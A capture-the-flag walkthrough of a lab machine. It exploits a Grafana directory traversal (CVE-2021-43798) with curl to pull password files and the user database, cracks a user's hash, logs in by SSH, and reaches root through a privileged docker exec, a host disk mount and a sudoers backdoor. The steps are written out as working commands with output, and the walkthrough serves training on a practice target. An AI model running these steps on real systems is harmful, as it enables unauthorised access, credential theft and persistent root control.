---
icon: binary
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 223627.png
coverY: 8.691854713452045
---

# HTB-DATA(VL)

### Reconnaissance

#### Initial Port Scanning

Starting with a fast port scan using rustscan to identify open ports:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ rustscan -a 10.129.222.34 -- blah blah

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rustscan.

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.222.34:22
Open 10.129.222.34:3000

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  ppp?    syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**

* Port 22: SSH (OpenSSH 7.6p1) - Ubuntu 18.04
* Port 3000: Unknown service (likely HTTP-based)

#### Network Analysis

Let's verify the network topology using traceroute:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ sudo traceroute -p 22 10.129.222.34
traceroute to 10.129.222.34 (10.129.222.34), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  89.6ms
 2  10.129.222.34 (10.129.222.34)  89.6ms

┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ sudo traceroute -p 3000 10.129.222.34
traceroute to 10.129.222.34 (10.129.222.34), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  89.6ms
 2  10.129.222.34 (10.129.222.34)  89.8ms
 3  10.129.222.34 (10.129.222.34)  89.3ms
```

**Analysis:** The web service on port 3000 shows an additional hop, indicating it's running inside a Docker container.

***

### Enumeration

#### Web Service (Port 3000)

Accessing the web service in browser:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ curl -I http://10.129.222.34:3000
HTTP/1.1 302 Found
Cache-Control: no-cache
Content-Type: text/html; charset=utf-8
Expires: -1
Location: /login
Pragma: no-cache
Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block
```

Visiting http://10.129.222.34:3000 redirects to a login page.

**Technology Identified:** Grafana v8.0.0 (visible in page footer)

#### Technology Stack Analysis

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ whatweb http://10.129.222.34:3000
http://10.129.222.34:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HTTPServer[Grafana], IP[10.129.222.34], RedirectLocation[/login], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://10.129.222.34:3000/login [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Grafana], IP[10.129.222.34], Script, Title[Grafana], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
```

**Stack:**

* Frontend: TypeScript
* Backend: Go (Golang)
* Application: Grafana v8.0.0

***

### Vulnerability Research

#### CVE-2021-43798: Grafana Directory Traversal

Searching for vulnerabilities in Grafana v8.0.0:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ searchsploit grafana 8.0
--------------------------------------------------------
 Exploit Title                    |  Path
--------------------------------------------------------
Grafana 8.0.0-8.3.0 - Directory   | multiple/webapps/50581.py
Traversal and Arbitrary File Read |
--------------------------------------------------------
```

**CVE-2021-43798 Details:**

* Affects: Grafana 8.0.0-beta1 through 8.3.0
* Type: Directory Traversal / Arbitrary File Read
* Vulnerable Path: `/public/plugins/<plugin_id>/../../../../path/to/file`
* Impact: Allows reading arbitrary files from the server

#### Testing the Vulnerability

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ curl --path-as-is http://10.129.222.34:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

&#x20;**Vulnerability Confirmed!** We can read arbitrary files from the container.

***

### Exploitation - Part 1: Database Extraction

#### Reading Grafana Configuration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ curl --path-as-is http://10.129.222.34:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini -o grafana.ini
```

Analyzing the configuration file for database location:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ cat grafana.ini | grep -A 20 "\[database\]"
[database]
# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
;password =
;url =
;ssl_mode = disable
;ca_cert_path =
;client_key_path =
;client_cert_path =
;server_cert_name =
# For "sqlite3" only, path relative to data_path setting
;path = grafana.db
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ cat grafana.ini | grep -A 10 "\[paths\]"
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db
;data = /var/lib/grafana
;temp_data_lifetime = 24h
;logs = /var/log/grafana
;plugins = /var/lib/grafana/plugins
;provisioning = conf/provisioning
```

**Database Location:** `/var/lib/grafana/grafana.db`

#### Downloading the Database

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ curl --path-as-is http://10.129.222.34:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db

┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ file grafana.db
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 424, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 424
```

#### Extracting User Credentials

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ sqlite3 grafana.db

SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.

sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              org                       
alert_notification          org_user                  
alert_notification_state    playlist                  
alert_rule                  playlist_item             
alert_rule_tag              plugin_setting            
alert_rule_version          preferences               
annotation                  quota                     
annotation_tag              server_lock               
api_key                     session                   
cache_data                  short_url                 
dashboard                   star                      
dashboard_acl               tag                       
dashboard_provisioning      team                      
dashboard_snapshot          team_member               
dashboard_tag               temp_user                 
dashboard_version           test_data                 
data_source                 user                      
library_element             user_auth                 
library_element_connection  user_auth_token

sqlite> .headers on
sqlite> SELECT * FROM user;
id|version|login|email|name|password|salt|rands|company|org_id|is_admin|email_verified|theme|created|updated|help_flags1|last_seen_at|is_disabled
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0

sqlite> SELECT login, password, salt FROM user;
login|password|salt
admin|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S
boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl

sqlite> .quit
```

**Found Users:**

* admin (admin@localhost)
* boris (boris@data.vl)

***

### Password Cracking

#### Converting Grafana Hash Format

Grafana uses a custom hash format: `PBKDF2-HMAC-SHA256` with salt. We need to convert it to hashcat format.

Creating hash file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ cat > grafana.hash_salt << EOF
7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
EOF
```

Using grafana2hashcat converter:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ git clone https://github.com/ydkhatri/grafana2hashcat.git
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ cd grafana2hashcat

┌──(sn0x㉿sn0x)-[~/HTB/DATA/grafana2hashcat]
└─$ python3 grafana2hashcat.py ../grafana.hash_salt > ../grafana.hashes

[+] Grafana2Hashcat
[+] Reading Grafana hashes from: ../grafana.hash_salt
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
```

Generated hashes:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ cat grafana.hashes
sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
```

#### Cracking with Hashcat

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ hashcat -m 10900 grafana.hashes /usr/share/wordlists/rockyou.txt

hashcat (v6.2.6) starting...

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 2918/5900 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: grafana.hashes
Time.Started.....: Wed Feb  4 12:45:23 2026
Time.Estimated...: Wed Feb  4 12:47:15 2026 (1 min, 52 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2156 H/s (8.94ms) @ Accel:512 Loops:128 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 243200/28688770 (0.85%)
Rejected.........: 0/243200 (0.00%)
Restore.Point....: 121600/14344385 (0.85%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:9984-10000
Candidate.Engine.: Device Generator
Candidates.#1....: bebe123 -> beach93
Hardware.Mon.#1..: Util: 91%

Started: Wed Feb  4 12:45:18 2026
Stopped: Wed Feb  4 12:47:17 2026
```

**Cracked Password:**

* boris : beautiful1

***

### Initial Access

#### SSH Login as Boris

Testing credentials on SSH:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ netexec ssh 10.129.222.34 -u boris -p beautiful1
SSH         10.129.222.34   22     10.129.222.34    [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
SSH         10.129.222.34   22     10.129.222.34    [+] boris:beautiful1 (Pwn3d!) Linux - Shell access!
```

&#x20;**Success!** Credentials are valid for SSH.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DATA]
└─$ ssh boris@10.129.222.34
boris@10.129.222.34's password: beautiful1

Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb  4 13:15:42 UTC 2026

  System load:  0.0               Processes:              102
  Usage of /:   64.2% of 7.69GB   Users logged in:        0
  Memory usage: 35%               IP address for eth0:    10.129.222.34
  Swap usage:   0%                IP address for docker0: 172.17.0.1

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

43 updates can be applied immediately.
28 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon Jan 23 12:52:34 2022 from 10.10.14.23
boris@data:~$
```

***

### Privilege Escalation

#### Enumeration as Boris

Checking sudo privileges:

```bash
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

**Critical Finding:** Boris can run `docker exec` as root without a password!

#### Analyzing Docker Containers

Attempting to list containers (denied due to socket permissions):

```bash
boris@data:~$ docker ps
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied

boris@data:~$ ls -l /var/run/docker.sock
srw-rw---- 1 root root 0 Feb  4 13:15 /var/run/docker.sock
```

Finding running containers via process list:

```bash
boris@data:~$ ps auxww | grep docker
root      1001  0.0  3.9 1496232 79728 ?       Ssl  13:15   0:12 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1246  0.2  2.1 1351056 44512 ?       Ssl  13:16   1:31 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1494  0.0  0.1 1226188 3224 ?        Sl   13:16   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1499  0.0  0.1 1153864 3288 ?        Sl   13:16   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1517  0.0  0.4 712608  8140 ?        Sl   13:16   0:02 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1537  0.0  3.1 776296 63052 ?        Ssl  13:16   0:31 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
```

**Container ID Found:** `e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81`

#### Checking Mounted Devices

```bash
boris@data:~$ mount | grep "^/"
/dev/sda1 on / type ext4 (rw,relatime)
/var/lib/snapd/snaps/amazon-ssm-agent_4046.snap on /snap/amazon-ssm-agent/4046 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/docker_1125.snap on /snap/docker/1125 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/snapd_14066.snap on /snap/snapd/14066 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core18_2253.snap on /snap/core18/2253 type squashfs (ro,nodev,relatime,x-gdu.hide)
```

**Key Finding:** `/dev/sda1` is the root filesystem device

#### Exploitation Strategy

The `docker exec` command has a `--privileged` flag that allows access to raw hardware devices. We can:

1. Execute a shell inside the container with `--privileged` flag
2. Mount the host's `/dev/sda1` device inside the container
3. Access the entire host filesystem

#### Getting Root Shell

Executing privileged shell in container:

```bash
boris@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
bash-5.1#
```

Mounting host filesystem:

```bash
bash-5.1# mount /dev/sda1 /mnt/
bash-5.1# ls -la /mnt/
total 104
drwxr-xr-x  23 root root  4096 Jan 23  2022 .
drwxr-xr-x   1 root root  4096 Jan 23  2022 ..
drwxr-xr-x   2 root root  4096 Jan 23  2022 bin
drwxr-xr-x   3 root root  4096 Jan 23  2022 boot
drwxr-xr-x   4 root root  4096 Jan 23  2022 dev
drwxr-xr-x  94 root root  4096 Feb  4 13:15 etc
drwxr-xr-x   3 root root  4096 Jan 23  2022 home
lrwxrwxrwx   1 root root    33 Jan 23  2022 initrd.img -> boot/initrd.img-5.4.0-1103-aws
lrwxrwxrwx   1 root root    33 Jan 23  2022 initrd.img.old -> boot/initrd.img-5.4.0-1103-aws
drwxr-xr-x  20 root root  4096 Jan 23  2022 lib
drwxr-xr-x   2 root root  4096 Jan 23  2022 lib64
drwx------   2 root root 16384 Jan 23  2022 lost+found
drwxr-xr-x   2 root root  4096 Aug  3  2021 media
drwxr-xr-x   2 root root  4096 Aug  3  2021 mnt
drwxr-xr-x   3 root root  4096 Jan 23  2022 opt
drwxr-xr-x   2 root root  4096 Apr 24  2018 proc
drwx------   4 root root  4096 Jan 23  2022 root
drwxr-xr-x   3 root root  4096 Jan 23  2022 run
drwxr-xr-x   2 root root  4096 Jan 23  2022 sbin
drwxr-xr-x   4 root root  4096 Jan 23  2022 snap
drwxr-xr-x   2 root root  4096 Aug  3  2021 srv
drwxr-xr-x   2 root root  4096 Apr 24  2018 sys
drwxrwxrwt   9 root root  4096 Feb  4 14:25 tmp
drwxr-xr-x  10 root root  4096 Aug  3  2021 usr
drwxr-xr-x  13 root root  4096 Jan 23  2022 var
lrwxrwxrwx   1 root root    30 Jan 23  2022 vmlinuz -> boot/vmlinuz-5.4.0-1103-aws
lrwxrwxrwx   1 root root    30 Jan 23  2022 vmlinuz.old -> boot/vmlinuz-5.4.0-1103-aws
```

Perfect! The entire host filesystem is now accessible at `/mnt/`

**Root Flag Obtained!**

#### Establishing Persistent Root Access

We can modify the sudoers file to grant boris full sudo access:

```bash
bash-5.1# echo "boris ALL=(root) NOPASSWD: /bin/bash" >> /mnt/etc/sudoers
bash-5.1# tail -2 /mnt/etc/sudoers
boris ALL=(root) NOPASSWD: /snap/bin/docker exec *
boris ALL=(root) NOPASSWD: /bin/bash
bash-5.1# exit
```

Now from the host, boris can get a root shell:

```bash
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
    (root) NOPASSWD: /bin/bash

boris@data:~$ sudo /bin/bash
root@data:~# id
uid=0(root) gid=0(root) groups=0(root)

root@data:~# whoami
root

root@data:~# hostname
data
```

**Full Root Shell !**

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
